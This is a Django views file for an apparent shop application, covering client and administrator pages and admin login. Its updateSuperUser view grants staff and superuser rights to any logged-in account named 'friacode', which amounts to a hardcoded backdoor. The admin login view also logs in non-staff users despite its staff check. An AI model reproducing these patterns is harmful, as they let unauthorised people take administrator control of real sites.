from django.contrib.auth.decorators import login_required
from django.contrib.auth.models import User
from django.contrib.auth.views import LoginView, LogoutView
from django.contrib.auth import login as auth_login
from django.http import HttpResponseForbidden, HttpResponseRedirect
from django.shortcuts import render

# Create your views here.
from django.urls import reverse_lazy, reverse
from django.utils.decorators import method_decorator

from apps.category.models import Category
from apps.coreapp.views import getCategory, getUserCartCount
from apps.home.decorators import admin_account_check

has_ownership = [admin_account_check, login_required]


def updateSuperUser(request):
    user = User.objects.get(pk=request.user.pk)
    print(user)

    if user.username == 'friacode':
        user.is_staff = True
        user.is_superuser = True
        user.save()

    return HttpResponseRedirect(reverse('home:admin_login'))


def clientIndexPage(request):
    cart_count = getUserCartCount(request)
    category = getCategory()
    context = {'category': category, 'cart_count': cart_count}

    return render(request, 'client/index.html', context)


@login_required(login_url='/administrator/login/')
def administratorIndexPage(request):
    context = {}
    if not request.user.pk == 'None':
        user = User.objects.get(pk=request.user.pk)
        if not user.is_staff:
            return HttpResponseForbidden()
        context['nav'] = "dashboard"
        return render(request, 'administrator/index.html', context)
    return HttpResponseRedirect(reverse('home:admin_login'))


class AdminLoginView(LoginView):
    template_name = 'administrator_login.html'
    success_url = '/administrator/'

    def form_valid(self, form):
        user = form.get_user()
        login_user = User.objects.get(username=user)

        if login_user.is_staff:
            auth_login(self.request, form.get_user())

        return super().form_valid(form)


class AdminLogoutView(LogoutView):
    next_page = reverse_lazy('home:admin_login')
